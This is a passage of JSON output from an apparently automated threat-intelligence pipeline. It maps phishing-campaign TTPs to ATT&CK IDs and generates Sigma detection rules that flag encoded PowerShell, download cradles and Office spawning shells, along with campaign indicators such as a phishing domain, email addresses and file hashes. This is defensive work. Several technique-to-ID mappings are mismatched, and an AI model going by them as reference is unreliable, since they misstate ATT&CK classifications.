        "description": "Detected Phishing activity via NLP pattern matching",
        "confidence_score": 0.684,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "d7d1f07d-0a77-4a9c-9564-68748ec64e04",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "PowerShell",
        "attack_id": "T1086",
        "tactic": "Execution",
        "description": "Detected PowerShell activity via NLP pattern matching",
        "confidence_score": 0.684,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "13fce22c-c586-4d8a-88b6-64d003b35e6e",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Defense Evasion",
        "attack_id": "T1218.009",
        "tactic": "Defense Evasion",
        "description": "Threat actor used URL phishing to evade detection",
        "confidence_score": 0.679,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "URL phishing",
          "dian.server.tl"
        ],
        "tools": [
          "URL phishing",
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "Sc",
          "apt",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5e5670ea-b3e1-4acf-ae63-0853023892c8",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1547.001",
        "tactic": "Persistence",
        "description": "Threat actor created or modified system processes to maintain persistence",
        "confidence_score": 0.652,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.268,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "system process"
        ],
        "tools": [
          "at",
          "system process",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "838d9af0-1b6b-483e-8756-7e3486c57af6",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "User Execution",
        "attack_id": "T1204.002",
        "tactic": "Execution",
        "description": "Threat actor used user execution to run malicious code",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "user execution"
        ],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "cmd",
          "ping",
          "powershell",
          "schtasks",
          "user execution"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "07c7153e-5d52-4994-bc7f-2246fd0cb77c",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1543",
        "tactic": "Persistence",
        "description": "Detected Create or Modify System Process activity via NLP pattern matching",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.246,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "5bb30b32-ec10-458c-9fd4-30a8fedbec82",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1204.002",
        "tactic": "Execution",
        "description": "Threat actor used cmd to execute malicious commands",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cmd.exe"
        ],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ed223d70-a172-477f-a2d2-5b9c6d98bfdb",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Scripting",
        "attack_id": "T1059.003",
        "tactic": "Execution",
        "description": "Threat actor used scripting to execute malicious code",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "scripting"
        ],
        "tools": [
          "at",
          "rar",
          "scripting",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "b1633ea2-b32d-486a-bd3b-7c7ec4957134",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Scripting",
        "attack_id": "T1059.005",
        "tactic": "Execution",
        "description": "Threat actor used scripting to execute malicious code",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "scripting"
        ],
        "tools": [
          "at",
          "rar",
          "scripting",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "37050cc2-2204-47e0-9c8c-870169b9d539",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "Detected Process Injection activity via NLP pattern matching",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.214,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "edaa49f4-338e-4e1e-84a9-0277f6be6c8e",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071",
        "tactic": "Command And Control",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "7d06ad88-10d7-48ef-9438-306f28ea2c83",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "8c4cd654-c409-4bd7-b3b0-2da0720380c1",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "777bc657-f4c8-49cb-a91e-de40b7aaa907",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Exfiltration Over C2 Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "a219344b-802d-4623-a59e-e2e923443f5e",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "56aa6692-fe18-4de1-84e4-259f06e734a5",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Scheduled Task/Job",
        "attack_id": "T1053",
        "tactic": "Persistence",
        "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "15b7af44-3cb0-4c29-99a7-bbce396f8b17",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Registry Run Keys",
        "attack_id": "T1547.001",
        "tactic": "Persistence",
        "description": "Detected Registry Run Keys activity via NLP pattern matching",
        "confidence_score": 0.623,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 21,
      "rules_generated": 21,
      "langchain_generations": 219,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 129211.333
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Execution",
        "status": "success",
        "rule": {
          "title": "Detect .NET Assembly Execution via Memory Injection",
          "description": "Detects execution of .NET assemblies that are likely injected into memory, using common Windows utilities such as dotnet.exe, rundll32.exe, and powershell.exe with suspicious command line arguments.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_dotnet": {
              "Image|endswith": "\\dotnet.exe",
              "CommandLine|contains": ".dll"
            },
            "selection_rundll": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": ".dll"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "condition": "selection_dotnet or selection_rundll or selection_powershell"
          },
          "falsepositives": [
            "Legitimate use of dotnet.exe for building or running .NET applications.",
            "System or administrative tasks that invoke rundll32.exe with valid DLLs.",
            "PowerShell scripts that use the -EncodedCommand (-enc) flag for legitimate automation."
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "custom.memory_injection",
            "custom.dotnet",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Execution",
          "generation_method": "langchain",
          "id": "d0f920c5-7de2-43b9-a0ee-9fb3d8410a6b",
          "siem_verification": {
            "rule_id": "d0f920c5-7de2-43b9-a0ee-9fb3d8410a6b",
            "attack_id": "e8eb1e87-4aa3-4812-aeeb-5fa3582c207d",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 846.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "status": "success",
        "rule": {
          "title": "Malicious DLL Execution via Rundll32 or Regsvr32 for Persistence",
          "description": "Detects execution of potentially malicious DLLs using rundll32.exe or regsvr32.exe, which are common techniques for establishing persistence on Windows systems.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": ".dll"
            },
            "selection2": {
              "Image|endswith": "\\regsvr32.exe",
              "CommandLine|contains": ".dll"
            },
            "condition": "selection1 or selection2"
          },
          "falsepositives": [
            "Legitimate use of rundll32.exe by Windows components (e.g., system utilities)",
            "Legitimate use of regsvr32.exe for registering COM components",
            "Software installers that invoke rundll32.exe or regsvr32.exe to register DLLs"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.t1112"
          ],
          "ttp_id": "unknown",
          "technique_name": "Persistence",
          "generation_method": "langchain",
          "id": "bb716978-9b3e-492a-b514-1115110ead50",
          "siem_verification": {
            "rule_id": "bb716978-9b3e-492a-b514-1115110ead50",
            "attack_id": "eaf86ae7-67bf-4113-b3f3-137f66de592e",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 635.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "PowerShell Execution with Suspicious Command-Line Arguments",
          "description": "Detects execution of PowerShell (powershell.exe) with potentially malicious command-line arguments such as encoded commands or Invoke-Expression, indicating possible abuse of the PowerShell execution technique.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image": {
              "Image|endswith": "\\powershell.exe"
            },
            "selection_enc": {
              "CommandLine|contains": "-enc"
            },
            "selection_iex": {
              "CommandLine|contains": "Invoke-Expression"
            },
            "condition": "selection_image and (selection_enc or selection_iex)"
          },
          "falsepositives": [
            "Legitimate administrative scripts run via PowerShell",
            "System management tools (e.g., SCCM, Intune) that invoke PowerShell",
            "Windows Update or built\u2011in Windows components that use PowerShell",
            "Security or monitoring agents that execute PowerShell commands"
          ],
          "level": "high",
          "tags": [
            "attack.t1059.001",
            "attack.execution",
            "custom.powershell"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "c425467f-2955-4f40-bec4-cd4759e60ca2",
          "siem_verification": {
            "rule_id": "c425467f-2955-4f40-bec4-cd4759e60ca2",
            "attack_id": "038cd684-c4b3-45c2-8b28-9e0d2e513daf",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 547.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Spearphishing Attachment",
        "status": "success",
        "rule": {
          "title": "Spearphishing Attachment with Malicious PDF Targeting Colombian Entities",
          "description": "Detects execution of malicious PDF attachments and related command activity associated with spearphishing campaigns targeting Colombian organizations. Includes detection of known malicious PDF hashes, suspicious Office processes spawning command shells, and Outlook usage with compromised email addresses.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "sel_pdf": {
              "Image|endswith": "\\AcroRd32.exe",
              "CommandLine|contains": "Fv3608799004720042L900483000P19878099700001537012.pdf"
            },
            "sel_office_cmd": {
              "Image|endswith": "\\cmd.exe",
              "ParentImage|endswith": "\\WINWORD.exe"
            },
            "sel_office_ps": {
              "Image|endswith": "\\powershell.exe",
              "ParentImage|endswith": "\\WINWORD.exe"
            },
            "sel_outlook_correspondencia": {
              "Image|endswith": "\\OUTLOOK.exe",
              "CommandLine|contains": "correspondencia@ccb.org.co"
            },
            "sel_outlook_alfredo": {
              "Image|endswith": "\\OUTLOOK.exe",
              "CommandLine|contains": "agudelomorenoalfredo79@gmail.com"
            },
            "sel_outlook_cobrofactura": {
              "Image|endswith": "\\OUTLOOK.exe",
              "CommandLine|contains": "cobrofactura09291@gmail.com"
            },
            "sel_hash_md5": {
              "Image|endswith": ".pdf",
              "Hashes|contains": "e4d2799f3001a531d15939b1898399b4"
            },
            "sel_hash_sha256": {
              "Image|endswith": ".pdf",
              "Hashes|contains": "fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554"
            },
            "condition": "sel_pdf or sel_office_cmd or sel_office_ps or sel_outlook_correspondencia or sel_outlook_alfredo or sel_outlook_cobrofactura or sel_hash_md5 or sel_hash_sha256"
          },
          "falsepositives": [
            "Legitimate opening of PDF files with AcroRd32.exe",
            "Normal use of Outlook to send emails to internal or external contacts",
            "Office macros that legitimately launch cmd.exe or powershell.exe",
            "Administrative scripts that process PDF files"
          ],
          "level": "high",
          "tags": [
            "attack.t1566.001",
            "attack.initial_access",
            "custom.spearphishing-attachment",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Spearphishing Attachment",
          "generation_method": "langchain",
          "id": "534edaf4-d2d6-43cf-8a77-0f8ecb0d83b8",
          "siem_verification": {
            "rule_id": "534edaf4-d2d6-43cf-8a77-0f8ecb0d83b8",
            "attack_id": "a124ee55-74ed-4ddb-b78b-a9cf56092829",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 526.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "status": "success",
        "rule": {
          "title": "Office Document Spawning Command Shells (Phishing)",
          "description": "Detects potential phishing activity where Microsoft Office processes (WINWORD.EXE) spawn command-line interpreters such as cmd.exe or PowerShell, which is a common behavior of malicious macros used in phishing attacks.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_word_cmd": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\cmd.exe"
            },
            "selection_word_ps": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe"
            },
            "selection_ps_enc": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "condition": "selection_word_cmd or selection_word_ps or selection_ps_enc"
          },
          "falsepositives": [
            "Legitimate Office macros that automate tasks using PowerShell or cmd.exe",
            "IT administrators using Office documents to launch scripts for deployment",
            "User-initiated automation via Office add\u2011ins that invoke command shells"
          ],
          "level": "high",
          "tags": [
            "attack.t1566",
            "attack.initial_access",
            "custom.phishing",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Phishing",
          "generation_method": "langchain",
          "id": "9a284703-b9fe-4718-9931-0eee5d50b473",
          "siem_verification": {
            "rule_id": "9a284703-b9fe-4718-9931-0eee5d50b473",
            "attack_id": "11d1143c-484b-4fbb-950c-ca8073e8ec61",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 997.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "Suspicious PowerShell Execution with Encoded or Network Commands",
          "description": "Detects PowerShell processes that use encoded commands or invoke network-related cmdlets, which are commonly used by attackers for stealthy execution and data exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_ps": {
              "Image|endswith": "\\powershell.exe"
            },
            "selection_enc": {
              "CommandLine|contains": "-enc"
            },
            "selection_encodedcommand": {
              "CommandLine|contains": "-EncodedCommand"
            },
            "selection_iwr": {
              "CommandLine|contains": "Invoke-WebRequest"
            },
            "selection_download": {
              "CommandLine|contains": "DownloadFile"
            },
            "selection_iex": {
              "CommandLine|contains": "IEX"
            },
            "condition": "selection_ps and (selection_enc or selection_encodedcommand or selection_iwr or selection_download or selection_iex)"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use PowerShell with encoded commands for deployment.",
            "System management tools that invoke PowerShell with network cmdlets (e.g., Windows Update, SCCM).",
            "Security or monitoring solutions that run PowerShell to collect telemetry."
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059.001",
            "attack.t1086"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "9284c9ba-50c1-4b1d-bfea-2d25b49b9cb6",
          "siem_verification": {
            "rule_id": "9284c9ba-50c1-4b1d-bfea-2d25b49b9cb6",
            "attack_id": "53782e1f-9409-4730-b2bf-44f0d655cb34",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 479.00000000000006,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Defense Evasion",
        "status": "success",
        "rule": {
          "title": "Execution of PowerShell or CMD with Known Phishing URL",
          "description": "Detects processes (PowerShell, cmd.exe) or Office applications spawning command shells where the command line contains the phishing domain \"dian.server.tl\", indicating a possible URL phishing based defense evasion attempt.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "dian.server.tl"
            },
            "selection2": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "dian.server.tl"
            },
            "selection3": {
              "ParentImage|endswith": "\\winword.exe",
              "CommandLine|contains": "dian.server.tl"
            },
            "condition": "selection1 or selection2 or selection3"
          },
          "falsepositives": [
            "Legitimate administrative scripts that download resources from the domain for testing or internal tooling.",
            "Security or IT staff using PowerShell or cmd.exe to retrieve files from the domain during authorized investigations.",
            "Automated software updates or installers that reference the domain for legitimate content delivery."
          ],
          "level": "medium",
          "tags": [
            "attack.t1566",
            "attack.defense_evasion",
            "custom.windows",
            "custom.sysmon",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Defense Evasion",
          "generation_method": "langchain",
          "id": "1c0cd537-6e95-48da-8f76-e99dd4b2af99",
          "siem_verification": {
            "rule_id": "1c0cd537-6e95-48da-8f76-e99dd4b2af99",
            "attack_id": "17309714-80ec-4a39-90da-5ca1911079a7",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 451.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Suspicious Creation of Critical System Process",
          "description": "Detects creation of critical Windows system processes (e.g., services.exe, svchost.exe, lsass.exe, winlogon.exe, csrss.exe) that are launched by suspicious parent processes such as cmd.exe, powershell.exe, wmic.exe, or cscript.exe. This behavior may indicate an attacker creating or modifying a system process to achieve persistence.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_system": {
              "Image|endswith": [
                "\\\\services.exe",
                "\\\\svchost.exe",
                "\\\\lsass.exe",
                "\\\\winlogon.exe",
                "\\\\csrss.exe"
              ]
            },
            "selection_suspicious_parent": {
              "ParentImage|endswith": [
                "\\\\cmd.exe",
                "\\\\powershell.exe",
                "\\\\wmic.exe",
                "\\\\cscript.exe"
              ]
            },
            "condition": "selection_system and selection_suspicious_parent"
          },
          "falsepositives": [
            "Legitimate system service restarts performed by administrators",
            "Windows Update or patching processes that restart services",
            "Automated maintenance scripts that invoke system processes via command shells"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.t1543.003"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "id": "b22d048e-99e5-42a6-8dfd-d3f876152063",
          "siem_verification": {
            "rule_id": "b22d048e-99e5-42a6-8dfd-d3f876152063",
            "attack_id": "1edeb18d-3720-41bc-9421-b7034473557d",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 1014.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "status": "success",
        "rule": {
          "title": "User Execution of Potentially Malicious Processes via Explorer",
          "description": "Detects processes commonly used for user-executed malicious code that are launched from Windows Explorer, indicating possible User Execution (T1204) technique.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\powershell.exe"
            },
            "selection_cmd": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\cmd.exe"
            },
            "selection_wscript": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\wscript.exe"
            },
            "selection_mshta": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\mshta.exe"
            },
            "selection_rundll32": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\rundll32.exe"
            },
            "condition": "selection_powershell or selection_cmd or selection_wscript or selection_mshta or selection_rundll32"
          },
          "falsepositives": [
            "Legitimate use of PowerShell, cmd.exe, wscript.exe, mshta.exe, or rundll32.exe launched from Explorer for system administration or scripting tasks.",
            "User-initiated batch files or scripts run via Explorer for routine maintenance.",
            "Software installers that invoke these executables during normal installation processes."
          ],
          "level": "medium",
          "tags": [
            "attack.t1204",
            "attack.execution",
            "custom.user_execution",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "User Execution",
          "generation_method": "langchain",
          "id": "0d19eed9-bd0c-4b3b-85da-5a9511781131",
          "siem_verification": {
